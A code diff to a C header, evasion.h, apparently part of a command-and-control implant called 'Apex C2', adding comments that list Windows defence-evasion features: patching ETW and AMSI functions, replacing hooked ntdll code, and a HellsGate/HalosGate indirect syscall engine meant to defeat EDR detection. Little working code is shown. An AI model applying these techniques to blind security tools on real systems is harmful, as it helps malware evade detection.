@@ -1,6 +1,17 @@
 #ifndef APEX_EVASION_H
 #define APEX_EVASION_H
 
+/*
+ * evasion.h — Apex C2 Windows Evasion Module
+ *
+ * Features (each toggled at compile time via -D flags):
+ *   ENABLE_ETW_PATCH         — Patch EtwEventWrite to xor eax,eax; ret
+ *   ENABLE_AMSI_PATCH        — Patch AmsiScanBuffer to return E_INVALIDARG
+ *   ENABLE_SLEEP_ENCRYPT     — Obfuscated sleep (currently plain Sleep)
+ *   ENABLE_UNHOOK            — Replace hooked ntdll .text with clean on-disk copy
+ *   ENABLE_INDIRECT_SYSCALL  — HellsGate/HalosGate indirect syscall engine
+ */
+
 #include <windows.h>
 
 #ifndef NTSTATUS
@@ -97,5 +108,14 @@ static int unhook_ntdll(void) {
     CloseHandle(hFile);
     return 0;
 }
+
+/* ── Indirect Syscall Engine ─────────────────────────────────────
+   Initialise with gate_init() to pre-resolve all NT SSNs.
+   Provides Gate_Nt* wrappers that execute via our own RWX stub
+   rather than ntdll, defeating call-stack-based EDR heuristics.
+*/
+#if ENABLE_INDIRECT_SYSCALL
+#include "syscall.h"
+#endif
 
 #endif /* APEX_EVASION_H */
